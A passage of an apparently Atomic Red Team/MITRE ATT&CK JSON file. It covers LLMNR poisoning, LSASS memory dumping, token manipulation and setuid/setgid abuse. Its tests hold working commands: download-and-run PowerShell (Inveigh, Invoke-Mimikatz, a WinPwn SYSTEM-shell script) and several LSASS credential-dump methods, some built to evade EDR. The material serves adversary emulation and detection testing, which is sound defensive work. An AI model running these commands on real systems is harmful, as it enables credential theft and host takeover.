attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.\u00a0\n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)", "atomic_tests": [{"name": "LLMNR Poisoning with Inveigh (PowerShell)", "auto_generated_guid": "deecd55f-afe0-4a62-9fba-4d1ba2deb321", "description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y", "name": "powershell", "elevation_required": true}}]}, "T1003.001": {"name": "LSASS Memory", "technique_id": "attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90", "external_id": "T1003.001", "data_components": ["Process Creation", "Command Execution", "Process Access", "OS API Execution"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--49c06d54-9002-491d-9147-8efb537fbd26", "course-of-action--72dade3e-1cba-4182-b3b3-a77ca52f02a1", "course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as comsvcs.dll can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n", "atomic_tests": [{"name": "Dump LSASS.exe Memory using ProcDump", "auto_generated_guid": "0be2230c-9ab3-4ac2-8826-3199b9a0ebf8", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Path where resulting dump should be placed", "type": "path", "default": "C:\\Windows\\Temp\\lsass_dump.dmp"}, "procdump_exe": {"description": "Path of Procdump executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n", "prereq_command": "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{procdump_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\\Procdump.exe\" \"#{procdump_exe}\" -Force\n"}], "executor": {"command": "\"#{procdump_exe}\" -accepteula -ma lsass.exe #{output_file}\n", "cleanup_command": "del \"#{output_file}\" >nul 2> nul\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Dump LSASS.exe Memory using comsvcs.dll", "auto_generated_guid": "2536dee2-12fb-459a-8c37-971844fa73be", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n", "supported_platforms": ["windows"], "executor": {"command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n", "cleanup_command": "Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Dump LSASS.exe Memory using direct system calls and API unhooking", "auto_generated_guid": "7ae7102c-a099-45c8-b985-4c7a2d05790d", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n", "supported_platforms": ["windows"], "input_arguments": {"dumpert_exe": {"description": "Path of Dumpert executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Dumpert executable must exist on disk at specified location (#{dumpert_exe})\n", "prereq_command": "if (Test-Path \"#{dumpert_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -ItemType Directory (Split-Path \"#{dumpert_exe}\") -Force | Out-Null\nInvoke-WebRequest \"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\" -OutFile \"#{dumpert_exe}\"\n"}], "executor": {"command": "\"#{dumpert_exe}\"\n", "cleanup_command": "del C:\\windows\\temp\\dumpert.dmp >nul 2> nul\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Dump LSASS.exe Memory using NanoDump", "auto_generated_guid": "dddd4aca-bbed-46f0-984d-e4c5971c51ea", "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n", "prereq_command": "if (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/helpsystems/nanodump/raw/84db0c1737bbe027431733c193cfacf59a07259b/compiled/nanodump.x64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe\"\n"}], "executor": {"command": "%temp%\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"\n", "cleanup_command": "del \"%temp%\\nanodump.dmp\" >nul 2> nul\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Dump LSASS.exe Memory using Windows Task Manager", "auto_generated_guid": "dea6c349-f1c6-44f3-87a1-1ed33a59a607", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task\nManager and administrative permissions.\n", "supported_platforms": ["windows"], "executor": {"steps": "1. Open Task Manager:\n  On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking\n  on the task bar and selecting \"Task Manager\".\n\n2. Select lsass.exe:\n  If lsass.exe is not visible, select \"Show processes from all users\". This will allow you to observe execution of lsass.exe\n  and select it for manipulation.\n\n3. Dump lsass.exe memory:\n  Right-click on lsass.exe in Task Manager. Select \"Create Dump File\". The following dialog will show you the path to the saved file.\n", "name": "manual"}}, {"name": "Offline Credential Theft With Mimikatz", "auto_generated_guid": "453acf13-1dbd-47d7-b28a-172ce9228023", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n", "supported_platforms": ["windows"], "input_arguments": {"input_file": {"description": "Path of the Lsass dump", "type": "path", "default": "%tmp%\\lsass.DMP"}, "mimikatz_exe": {"description": "Path of the Mimikatz binary", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n", "prereq_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"}, {"description": "Lsass dump must exist at specified location (#{input_file})\n", "prereq_command": "cmd /c \"if not exist #{input_file} (exit /b 1)\"\n", "get_prereq_command": "Write-Host \"Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)\"\n"}], "executor": {"command": "\"#{mimikatz_exe}\" \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n", "name": "command_prompt", "elevation_required": true}}, {"name": "LSASS read with pypykatz", "auto_generated_guid": "c37bc535-5c62-4195-9cc3-0517673171d8", "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n", "supported_platforms": ["windows"], "dependency_executor_name": "command_prompt", "dependencies": [{"description": "Computer must have python 3 installed\n", "prereq_command": "py -3 --version >nul 2>&1\nexit /b %errorlevel%\n", "get_prereq_command": "echo \"Python 3 must be installed manually\"\n"}, {"description": "Computer must have pip installed\n", "prereq_command": "py -3 -m pip --version >nul 2>&1\nexit /b %errorlevel%\n", "get_prereq_command": "echo \"PIP must be installed manually\"\n"}, {"description": "pypykatz must be installed and part of PATH\n", "prereq_command": "pypykatz -h >nul 2>&1\nexit /b %errorlevel%\n", "get_prereq_command": "pip install pypykatz\n"}], "executor": {"command": "pypykatz live lsa\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Dump LSASS.exe Memory using Out-Minidump.ps1", "auto_generated_guid": "6502c8f0-b775-4dbd-9193-1298f56b6781", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:TEMP\\lsass_*.dmp.\n\nAuthor of Out-Minidump: Matthew Graeber (@mattifestation)\n", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump\n", "cleanup_command": "Remove-Item $env:TEMP\\lsass_*.dmp -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Create Mini Dump of LSASS.exe using ProcDump", "auto_generated_guid": "7cede33f-0acd-44ef-9774-15511300b24b", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Path where resulting dump should be placed", "type": "path", "default": "C:\\Windows\\Temp\\lsass_dump.dmp"}, "procdump_exe": {"description": "Path of Procdump executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n", "prereq_command": "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{procdump_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\\Procdump.exe\" \"#{procdump_exe}\" -Force\n"}], "executor": {"command": "\"#{procdump_exe}\" -accepteula -mm lsass.exe #{output_file}\n", "cleanup_command": "del \"#{output_file}\" >nul 2> nul\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Powershell Mimikatz", "auto_generated_guid": "66fb0bc1-3c3f-47e9-a298-550ecfefacbc", "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n", "supported_platforms": ["windows"], "input_arguments": {"remote_script": {"description": "URL to a remote Mimikatz script that dumps credentials", "type": "url", "default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"}}, "executor": {"command": "IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\n", "name": "powershell", "elevation_required": true}}, {"name": "Dump LSASS with createdump.exe from .Net v5", "auto_generated_guid": "9d0072c8-7cca-45c4-bd14-f852cfa35cf0", "description": "Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": ".Net v5 must be installed\n", "prereq_command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}\n", "get_prereq_command": "winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent\n"}], "executor": {"command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\n& \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id\n", "cleanup_command": "Remove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Dump LSASS.exe using imported Microsoft DLLs", "auto_generated_guid": "86fc3f40-237f-4701-b155-81c01c48d697", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n", "supported_platforms": ["windows"], "input_arguments": {"xordump_exe": {"description": "Path to xordump", "type": "path", "default": "C:\\Windows\\Temp\\xordump.exe"}, "output_file": {"description": "Path where resulting dump should be placed", "type": "path", "default": "C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp"}}, "dependencies": [{"description": "Computer must have xordump.exe\n", "prereq_command": "if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile #{xordump_exe}\n"}], "executor": {"command": "#{xordump_exe} -out #{output_file} -x 0x41\n", "cleanup_command": "Remove-Item #{output_file} -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Dump LSASS.exe using lolbin rdrleakdiag.exe", "auto_generated_guid": "47a539d1-61b9-4364-bf49-a68bc2a95ef0", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. \nThis can be achieved with lolbin rdrleakdiag.exe. \n\nUpon successful execution, you should see the following files created, $env:TEMP\\minidump_<PID>.dmp and  $env:TEMP\\results_<PID>.hlk.\n", "supported_platforms": ["windows"], "executor": {"command": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n& $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"\n", "cleanup_command": "Remove-Item $env:TEMP\\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}]}, "T1134.002": {"name": "Create Process with Token", "technique_id": "attack-pattern--677569f9-a8b0-459e-ab24-7f18091fa7bf", "external_id": "T1134.002", "data_components": ["Command Execution", "OS API Execution"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)\n\nCreating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.\n\nWhile this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.", "atomic_tests": [{"name": "Access Token Manipulation", "auto_generated_guid": "dbf4f5a9-b8e0-46a3-9841-9ad71247239e", "description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n", "supported_platforms": ["windows"], "executor": {"command": "Set-ExecutionPolicy -Scope Process Bypass -Force\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nGet-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n& \"$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")\n", "name": "powershell", "elevation_required": true}}, {"name": "WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique", "auto_generated_guid": "ccf4ac39-ec93-42be-9035-90e2f26bcd92", "description": "Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem", "name": "powershell"}}]}, "T1548.001": {"name": "Setuid and Setgid", "technique_id": "attack-pattern--6831414d-bb70-42b7-8030-d4e06b2660c9", "external_id": "T1548.001", "data_components": ["File Modification", "File Metadata", "Command Execution"], "kill_chain_phases": ["privilege-escalation", "defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3"], "description": "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user\u2019s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.\n\nAlternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)", "atomic_tests": [{"name": "Make and modify binary from C source", "auto_generated_guid": "896dfe97-ae43-4101-8e96-9a7996555d80", "description": "Make, change owner, and change file attributes on a C source code file\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"payload": {"description": "hello.c payload", "type": "path", "default": "PathToAtomicsFolder/T1548.001/src/hello.c"}}, "executor": {"command": "cp #{payload} /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello\n", "cleanup_command": "sudo rm /tmp/hello\nsudo rm /tmp/hello.c\n", "name": "sh", "elevation_required": true}}, {"name": "Make and modify binary from C source (freebsd)", "auto_generated_guid": "dd580455-d84b-481b-b8b0-ac96f3b1dc4c", "description": "Make, change owner, and change file attributes on a C source code file\n", "supported_platforms": ["linux"], "input_arguments": {"payload": {"description": "hello.c payload", "type": "path", "default": "PathToAtomicsFolder/T1548.001/src/hello.c"}}, "executor": {"command": "cp #{payload} /tmp/hello.c\nchown root /tmp/hello.c\nmake /tmp/hello\nchown root /tmp/hello\nchmod u+s /tmp/hello\n/tmp/hello\n", "cleanup_command": "rm /tmp/hello\nrm /tmp/hello.c\n", "name": "sh", "elevation_required": true}}, {"name": "Set a SetUID flag on file", "auto_generated_guid": "759055b3-3885-4582-a8ec-c00c9d64dd79", "description": "This test sets the SetUID flag on a file in FreeBSD.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_to_setuid": {"description": "Path of file to set SetUID flag", "type": "path", "default": "/tmp/evilBinary"}}, "executor": {"command": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod u+xs #{file_to_setuid}\n", "cleanup_command": "sudo rm #{file_to_setuid}\n", "name": "sh", "elevation_required": true}}, {"name": "Set a SetUID flag on file (freebsd)", "auto_generated_guid": "9be9b827-ff47-4e1b-bef8-217db6fb7283", "description": "This test sets the SetUID flag on a file in FreeBSD.\n", "supported_platforms": ["linux"], "input_arguments": {"file_to_setuid": {"description": "Path of file to set SetUID flag", "type": "path", "default": "/tmp/evilBinary"}}, "executor": {"command": "touch #{file_to_setuid}\nchown root #{file_to_setuid}\nchmod u+xs #{file_to_setuid}\n", "cleanup_command": "rm #{file_to_setuid}\n", "name": "sh", "elevation_required": true}}, {"name": "Set a SetGID flag on file", "auto_generated_guid": "db55f666-7cba-46c6-9fe6-205a05c3242c", "description": "This test sets the SetGID flag on a file in Linux and macOS.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_to_setuid": {"description": "Path of file to set SetGID flag", "type": "path", "default": "/tmp/evilBinary"}}, "executor": {"command": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod g+xs #{file_to_setuid}\n", "cleanup_command": "sudo rm #{file_to_setuid}\n", "name": "sh", "elevation_required": true}}, {"name": "Set a SetGID flag on file (freebsd)", "auto_generated_guid": "1f73af33-62a8-4bf1-bd10-3bea931f2c0d", "description": "This test sets the SetGID flag on a file in FreeBSD.\n", "supported_platforms": ["linux"], "input_arguments": {"file_to_setuid": {"description": "Path of file to set SetGID flag", "type": "path", "default": "/tmp/evilBinary"}}, "executor": {"command": "touch #{file_to_setuid}\nchown root #{file_to_setuid}\nchmod g+xs #{file_to_setuid}\n", "cleanup_command": "rm #{file_to_setuid}\n", "name": "sh", "elevation_required": true}}, {"name": "Make and modify capabilities of a binary", "auto_generated_guid": "db53959c-207d-4000-9e7a-cd8eb417e072", "description": "Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.\nThe binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.\nWithout being owned by root, the binary can set the UID to 0.\n", "supported_platforms": ["linux"], "input_arguments": {"payload": {"description": "cap.c payload", "type": "path", "default": "PathToAtomicsFolder/T1548.001/src/cap.c"}}, "executor": {"command": "cp #{payload} /tmp/cap.c\nmake /tmp/cap\nsudo setcap cap_setuid=ep /tmp/cap\n/tmp/cap\n", "cleanup_command": "rm /tmp/cap\nrm /tmp/cap.c\n", "name": "sh", "elevation_required": true}}, {"name": "Provide the SetUID capability to a file", "auto_generated_guid": "1ac3272f-9bcf-443a-9888-4b1d3de785c1", "description": "This test gives a file the capability to set UID without using flags.\n", "supported_platforms": ["linux"], "input_arguments": {"file_to_setcap": {"description": "Path of file to provide the SetUID capability", "type": "path", "default": "/tmp/evilBinary"}}, "executor": 